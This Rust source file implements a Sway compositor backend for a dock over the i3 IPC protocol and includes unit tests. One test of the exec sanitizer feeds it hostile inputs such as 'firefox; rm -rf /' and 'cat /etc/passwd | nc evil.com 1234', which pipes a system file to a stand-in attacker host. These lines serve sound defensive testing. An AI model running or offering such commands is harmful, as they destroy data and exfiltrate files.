mod events;
mod ipc;
mod tree;
mod types;

use super::traits::{Compositor, WmEventStream};
use super::types::{WmClient, WmMonitor};
use crate::error::{DockError, Result};
use std::os::unix::net::UnixStream;
use std::path::PathBuf;

/// Sway compositor backend using the i3-compatible IPC protocol.
pub struct SwayBackend {
    socket_path: PathBuf,
}

impl SwayBackend {
    pub fn new() -> Result<Self> {
        let path =
            std::env::var("SWAYSOCK").map_err(|_| DockError::EnvNotSet("SWAYSOCK".into()))?;
        Ok(Self {
            socket_path: PathBuf::from(path),
        })
    }

    fn command(&self, msg_type: u32, payload: &[u8]) -> Result<Vec<u8>> {
        let mut conn = UnixStream::connect(&self.socket_path)?;
        ipc::send_message(&mut conn, msg_type, payload)?;
        ipc::read_response(&mut conn)
    }

    fn run_command(&self, cmd: &str) -> Result<()> {
        let reply = self.command(ipc::MSG_RUN_COMMAND, cmd.as_bytes())?;
        // Sway returns [{"success": true/false, ...}]
        let results: Vec<serde_json::Value> = serde_json::from_slice(&reply)?;
        if let Some(first) = results.first()
            && first.get("success").and_then(|v| v.as_bool()) == Some(false)
        {
            let err_msg = first
                .get("error")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown error");
            return Err(DockError::Ipc(std::io::Error::other(err_msg.to_string())));
        }
        Ok(())
    }
}

impl Compositor for SwayBackend {
    fn list_clients(&self) -> Result<Vec<WmClient>> {
        let reply = self.command(ipc::MSG_GET_TREE, &[])?;
        let tree_val: serde_json::Value = serde_json::from_slice(&reply)?;
        Ok(tree::collect_clients_from_tree(&tree_val))
    }

    fn list_monitors(&self) -> Result<Vec<WmMonitor>> {
        let reply = self.command(ipc::MSG_GET_OUTPUTS, &[])?;
        tree::parse_monitors(&reply)
    }

    fn get_active_window(&self) -> Result<WmClient> {
        let reply = self.command(ipc::MSG_GET_TREE, &[])?;
        let tree_val: serde_json::Value = serde_json::from_slice(&reply)?;
        tree::find_focused_window(&tree_val).ok_or_else(|| {
            DockError::Ipc(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "no focused window",
            ))
        })
    }

    fn get_cursor_position(&self) -> Option<(i32, i32)> {
        // Sway does not expose cursor position via IPC
        None
    }

    fn focus_window(&self, id: &str) -> Result<()> {
        self.run_command(&format!("[con_id={}] focus", validate_con_id(id)?))
    }

    fn close_window(&self, id: &str) -> Result<()> {
        self.run_command(&format!("[con_id={}] kill", validate_con_id(id)?))
    }

    fn toggle_floating(&self, id: &str) -> Result<()> {
        self.run_command(&format!(
            "[con_id={}] floating toggle",
            validate_con_id(id)?
        ))
    }

    fn toggle_fullscreen(&self, id: &str) -> Result<()> {
        self.run_command(&format!(
            "[con_id={}] fullscreen toggle",
            validate_con_id(id)?
        ))
    }

    fn move_to_workspace(&self, id: &str, workspace: i32) -> Result<()> {
        self.run_command(&format!(
            "[con_id={}] move to workspace number {}",
            validate_con_id(id)?,
            workspace
        ))
    }

    fn toggle_special_workspace(&self, _name: &str) -> Result<()> {
        // Sway's equivalent of special workspaces is the scratchpad
        self.run_command("scratchpad show")
    }

    fn raise_active(&self) -> Result<()> {
        // Sway manages its own stacking — no equivalent needed
        Ok(())
    }

    fn exec(&self, cmd: &str) -> Result<()> {
        let sanitized = super::sanitize_exec_command(cmd);
        self.run_command(&format!("exec {}", sanitized))
    }

    fn event_stream(&self) -> Result<Box<dyn WmEventStream>> {
        let conn = UnixStream::connect(&self.socket_path)?;
        Ok(Box::new(events::SwayEventStream::connect(conn)?))
    }

    fn supports_cursor_position(&self) -> bool {
        false
    }
}

/// Validates that a Sway container ID is numeric to prevent command injection.
fn validate_con_id(id: &str) -> Result<&str> {
    if !id.is_empty() && id.chars().all(|c| c.is_ascii_digit()) {
        Ok(id)
    } else {
        Err(DockError::Ipc(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("invalid Sway container id: {}", id),
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::compositor::types::WmWorkspace;

    #[test]
    fn encode_decode_header() {
        let mut buf = Vec::new();
        buf.extend_from_slice(ipc::I3_IPC_MAGIC);
        buf.extend_from_slice(&5u32.to_le_bytes());
        buf.extend_from_slice(&ipc::MSG_RUN_COMMAND.to_le_bytes());
        assert_eq!(&buf[..6], b"i3-ipc");
        assert_eq!(u32::from_le_bytes(buf[6..10].try_into().unwrap()), 5);
        assert_eq!(u32::from_le_bytes(buf[10..14].try_into().unwrap()), 0);
    }

    #[test]
    fn collect_windows_from_tree() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [{
                    "type": "workspace",
                    "name": "1",
                    "num": 1,
                    "nodes": [{
                        "type": "con",
                        "id": 42,
                        "name": "Firefox",
                        "app_id": "firefox",
                        "pid": 1234,
                        "focused": false,
                        "fullscreen_mode": 0,
                        "nodes": [],
                        "floating_nodes": []
                    }],
                    "floating_nodes": [{
                        "type": "floating_con",
                        "nodes": [{
                            "type": "con",
                            "id": 43,
                            "name": "Calculator",
                            "app_id": "gnome-calculator",
                            "pid": 5678,
                            "focused": false,
                            "fullscreen_mode": 0,
                            "nodes": [],
                            "floating_nodes": []
                        }],
                        "floating_nodes": []
                    }]
                }]
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 2);
        assert_eq!(clients[0].class, "firefox");
        assert_eq!(clients[0].id, "42");
        assert_eq!(clients[0].title, "Firefox");
        assert_eq!(clients[0].pid, 1234);
        assert_eq!(clients[0].workspace.name, "1");
        assert_eq!(clients[0].workspace.id, 1);
        assert!(!clients[0].floating);
        assert_eq!(clients[1].class, "gnome-calculator");
        assert_eq!(clients[1].id, "43");
        assert!(clients[1].floating);
    }

    #[test]
    fn find_focused_in_tree() {
        let tree_val = serde_json::json!({
            "type": "root",
            "focused": false,
            "nodes": [{
                "type": "output",
                "focused": false,
                "nodes": [{
                    "type": "workspace",
                    "focused": false,
                    "nodes": [
                        {
                            "type": "con",
                            "id": 10,
                            "name": "Unfocused",
                            "app_id": "app1",
                            "pid": 100,
                            "focused": false,
                            "fullscreen_mode": 0,
                            "nodes": [],
                            "floating_nodes": []
                        },
                        {
                            "type": "con",
                            "id": 20,
                            "name": "Focused Window",
                            "app_id": "app2",
                            "pid": 200,
                            "focused": true,
                            "fullscreen_mode": 0,
                            "nodes": [],
                            "floating_nodes": []
                        }
                    ],
                    "floating_nodes": []
                }]
            }],
            "floating_nodes": []
        });

        let focused = tree::find_focused_window(&tree_val);
        assert!(focused.is_some());
        let f = focused.unwrap();
        assert_eq!(f.id, "20");
        assert_eq!(f.class, "app2");
        assert_eq!(f.title, "Focused Window");
    }

    #[test]
    fn x11_window_uses_window_properties() {
        let node = serde_json::json!({
            "type": "con",
            "id": 99,
            "name": "Steam",
            "app_id": null,
            "pid": 9999,
            "focused": false,
            "fullscreen_mode": 0,
            "window_properties": {
                "class": "steam",
                "instance": "steam",
                "title": "Steam"
            },
            "nodes": [],
            "floating_nodes": []
        });

        let client = types::node_to_wm_client(&node, false).unwrap();
        assert_eq!(client.class, "steam");
        assert_eq!(client.id, "99");
    }

    #[test]
    fn parse_output() {
        let output = serde_json::json!({
            "name": "DP-1",
            "active": true,
            "focused": true,
            "scale": 1.5,
            "current_workspace": "1",
            "rect": {"x": 0, "y": 0, "width": 3840, "height": 2160},
            "current_mode": {"width": 3840, "height": 2160, "refresh": 60000}
        });

        let mon = types::output_to_wm_monitor(&output, 0);
        assert_eq!(mon.name, "DP-1");
        assert_eq!(mon.width, 3840);
        assert_eq!(mon.height, 2160);
        assert!(mon.focused);
        assert!((mon.scale - 1.5).abs() < f64::EPSILON);
        assert_eq!(mon.active_workspace.name, "1");
    }

    #[test]
    fn parse_event_json() {
        let event = serde_json::json!({
            "change": "focus",
            "container": {
                "id": 42,
                "name": "Firefox",
                "app_id": "firefox",
                "focused": true
            }
        });

        let change = event.get("change").and_then(|v| v.as_str()).unwrap();
        assert_eq!(change, "focus");
        let id = event
            .get("container")
            .and_then(|c| c.get("id"))
            .and_then(|v| v.as_i64())
            .unwrap();
        assert_eq!(id, 42);
    }

    #[test]
    fn empty_tree_yields_no_windows() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [],
            "floating_nodes": []
        });
        let clients = tree::collect_clients_from_tree(&tree_val);
        assert!(clients.is_empty());
    }

    #[test]
    fn multi_monitor_assigns_correct_output_ids() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [
                {
                    "type": "output",
                    "name": "__i3",
                    "nodes": [],
                    "floating_nodes": []
                },
                {
                    "type": "output",
                    "name": "DP-1",
                    "nodes": [{
                        "type": "workspace",
                        "name": "1",
                        "num": 1,
                        "nodes": [{
                            "type": "con",
                            "id": 10,
                            "name": "App on DP-1",
                            "app_id": "app1",
                            "pid": 100,
                            "focused": false,
                            "fullscreen_mode": 0,
                            "nodes": [],
                            "floating_nodes": []
                        }],
                        "floating_nodes": []
                    }],
                    "floating_nodes": []
                },
                {
                    "type": "output",
                    "name": "HDMI-1",
                    "nodes": [{
                        "type": "workspace",
                        "name": "2",
                        "num": 2,
                        "nodes": [{
                            "type": "con",
                            "id": 20,
                            "name": "App on HDMI-1",
                            "app_id": "app2",
                            "pid": 200,
                            "focused": false,
                            "fullscreen_mode": 0,
                            "nodes": [],
                            "floating_nodes": []
                        }],
                        "floating_nodes": []
                    }],
                    "floating_nodes": []
                }
            ],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 2);
        assert_eq!(clients[0].class, "app1");
        assert_eq!(clients[0].monitor_id, 0);
        assert_eq!(clients[0].workspace.name, "1");
        assert_eq!(clients[1].class, "app2");
        assert_eq!(clients[1].monitor_id, 1);
        assert_eq!(clients[1].workspace.name, "2");
    }

    #[test]
    fn no_focused_window_returns_none() {
        let tree_val = serde_json::json!({
            "type": "root",
            "focused": false,
            "nodes": [{
                "type": "con",
                "id": 1,
                "app_id": "test",
                "pid": 1,
                "focused": false,
                "fullscreen_mode": 0,
                "nodes": [],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });
        assert!(tree::find_focused_window(&tree_val).is_none());
    }

    #[test]
    fn deeply_nested_containers() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [{
                    "type": "workspace",
                    "name": "3",
                    "num": 3,
                    "nodes": [{
                        "type": "con",
                        "layout": "splith",
                        "nodes": [{
                            "type": "con",
                            "layout": "splitv",
                            "nodes": [{
                                "type": "con",
                                "layout": "tabbed",
                                "nodes": [{
                                    "type": "con",
                                    "id": 77,
                                    "name": "Deep Window",
                                    "app_id": "deep-app",
                                    "pid": 7777,
                                    "focused": false,
                                    "fullscreen_mode": 0,
                                    "nodes": [],
                                    "floating_nodes": []
                                }],
                                "floating_nodes": []
                            }],
                            "floating_nodes": []
                        }],
                        "floating_nodes": []
                    }],
                    "floating_nodes": []
                }],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 1);
        assert_eq!(clients[0].class, "deep-app");
        assert_eq!(clients[0].id, "77");
        assert_eq!(clients[0].workspace.name, "3");
        assert_eq!(clients[0].workspace.id, 3);
    }

    #[test]
    fn tabbed_stacked_layouts() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [{
                    "type": "workspace",
                    "name": "1",
                    "num": 1,
                    "nodes": [{
                        "type": "con",
                        "layout": "tabbed",
                        "nodes": [
                            {"type": "con", "id": 101, "name": "Tab 1", "app_id": "tab-app-1", "pid": 1001, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []},
                            {"type": "con", "id": 102, "name": "Tab 2", "app_id": "tab-app-2", "pid": 1002, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []},
                            {"type": "con", "id": 103, "name": "Tab 3", "app_id": "tab-app-3", "pid": 1003, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}
                        ],
                        "floating_nodes": []
                    }],
                    "floating_nodes": []
                }],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 3);
        for client in &clients {
            assert_eq!(client.workspace.name, "1");
            assert_eq!(client.workspace.id, 1);
        }
    }

    #[test]
    fn multiple_workspaces_per_output() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [
                    {
                        "type": "workspace", "name": "1", "num": 1,
                        "nodes": [
                            {"type": "con", "id": 201, "name": "WS1 App A", "app_id": "ws1-a", "pid": 2001, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []},
                            {"type": "con", "id": 202, "name": "WS1 App B", "app_id": "ws1-b", "pid": 2002, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}
                        ],
                        "floating_nodes": []
                    },
                    {
                        "type": "workspace", "name": "2", "num": 2,
                        "nodes": [
                            {"type": "con", "id": 203, "name": "WS2 App", "app_id": "ws2-app", "pid": 2003, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}
                        ],
                        "floating_nodes": []
                    }
                ],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 3);
        assert_eq!(clients[0].workspace.name, "1");
        assert_eq!(clients[2].workspace.name, "2");
        assert_eq!(clients[2].class, "ws2-app");
    }

    #[test]
    fn mixed_x11_and_wayland_windows() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [{
                    "type": "workspace", "name": "1", "num": 1,
                    "nodes": [
                        {"type": "con", "id": 301, "name": "Firefox", "app_id": "firefox", "pid": 3001, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []},
                        {"type": "con", "id": 302, "name": "Steam", "app_id": null, "pid": 3002, "focused": false, "fullscreen_mode": 0, "window_properties": {"class": "steam", "instance": "steam", "title": "Steam"}, "nodes": [], "floating_nodes": []}
                    ],
                    "floating_nodes": []
                }],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 2);
        assert_eq!(clients[0].class, "firefox");
        assert_eq!(clients[1].class, "steam");
    }

    #[test]
    fn scratchpad_workspace_skipped() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [
                    {
                        "type": "workspace", "name": "1", "num": 1,
                        "nodes": [{"type": "con", "id": 401, "name": "Normal App", "app_id": "normal-app", "pid": 4001, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}],
                        "floating_nodes": []
                    },
                    {
                        "type": "workspace", "name": "__i3_scratch", "num": -1,
                        "nodes": [{"type": "con", "id": 402, "name": "Scratchpad App", "app_id": "scratch-app", "pid": 4002, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}],
                        "floating_nodes": []
                    }
                ],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 1);
        assert_eq!(clients[0].class, "normal-app");
    }

    #[test]
    fn depth_limit_prevents_overflow() {
        let mut node = serde_json::json!({
            "type": "con", "id": 999, "name": "Too Deep", "app_id": "deep-app",
            "pid": 9999, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []
        });
        for _ in 0..130 {
            node = serde_json::json!({
                "type": "con", "nodes": [node], "floating_nodes": []
            });
        }

        let mut clients = Vec::new();
        let ws = WmWorkspace {
            id: 0,
            name: "1".to_string(),
        };
        tree::collect_windows_with_context(&node, &mut clients, &ws, 0, false);
        assert!(
            clients.is_empty(),
            "window beyond MAX_TREE_DEPTH should not be collected"
        );
    }

    #[test]
    fn floating_windows_detected_correctly() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [{
                    "type": "workspace", "name": "1", "num": 1,
                    "nodes": [{"type": "con", "id": 501, "name": "Tiled App", "app_id": "tiled-app", "pid": 5001, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}],
                    "floating_nodes": [{
                        "type": "floating_con",
                        "nodes": [{"type": "con", "id": 502, "name": "Floating App", "app_id": "floating-app", "pid": 5002, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}],
                        "floating_nodes": []
                    }]
                }],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });

        let clients = tree::collect_clients_from_tree(&tree_val);
        assert_eq!(clients.len(), 2);
        let tiled = clients.iter().find(|c| c.id == "501").unwrap();
        assert!(!tiled.floating);
        let floating = clients.iter().find(|c| c.id == "502").unwrap();
        assert!(floating.floating);
    }

    #[test]
    fn window_without_app_id_or_properties_skipped() {
        let tree_val = serde_json::json!({
            "type": "root",
            "nodes": [{
                "type": "output",
                "name": "DP-1",
                "nodes": [{
                    "type": "workspace", "name": "1", "num": 1,
                    "nodes": [{"type": "con", "id": 600, "name": "Mystery Node", "pid": 100, "focused": false, "fullscreen_mode": 0, "nodes": [], "floating_nodes": []}],
                    "floating_nodes": []
                }],
                "floating_nodes": []
            }],
            "floating_nodes": []
        });
        let clients = tree::collect_clients_from_tree(&tree_val);
        assert!(
            clients.is_empty(),
            "node without app_id or window_properties should be skipped"
        );
    }

    #[test]
    fn sanitize_exec_strips_dangerous_chars() {
        assert_eq!(super::super::sanitize_exec_command("firefox"), "firefox");
        assert_eq!(
            super::super::sanitize_exec_command("firefox; rm -rf /"),
            "firefox rm -rf /"
        );
        assert_eq!(
            super::super::sanitize_exec_command("echo $HOME"),
            "echo HOME"
        );
        assert_eq!(
            super::super::sanitize_exec_command("firefox\nrm -rf /"),
            "firefoxrm -rf /"
        );
        assert_eq!(
            super::super::sanitize_exec_command("echo `whoami`"),
            "echo whoami"
        );
        assert_eq!(
            super::super::sanitize_exec_command("cat /etc/passwd | nc evil.com 1234"),
            "cat /etc/passwd  nc evil.com 1234"
        );
        assert_eq!(
            super::super::sanitize_exec_command("evil && rm -rf /"),
            "evil  rm -rf /"
        );
    }

    #[test]
    fn run_command_error_json() {
        let reply = serde_json::json!([{"success": false, "error": "No matching node"}]);
        let results: Vec<serde_json::Value> =
            serde_json::from_value(reply).expect("valid JSON array");
        let first = results.first().expect("should have one result");
        assert_eq!(first.get("success").and_then(|v| v.as_bool()), Some(false));
        assert_eq!(
            first.get("error").and_then(|v| v.as_str()).unwrap(),
            "No matching node"
        );

        let ok_reply = serde_json::json!([{"success": true}]);
        let ok_results: Vec<serde_json::Value> =
            serde_json::from_value(ok_reply).expect("valid JSON array");
        assert_eq!(
            ok_results[0].get("success").and_then(|v| v.as_bool()),
            Some(true)
        );
    }
}
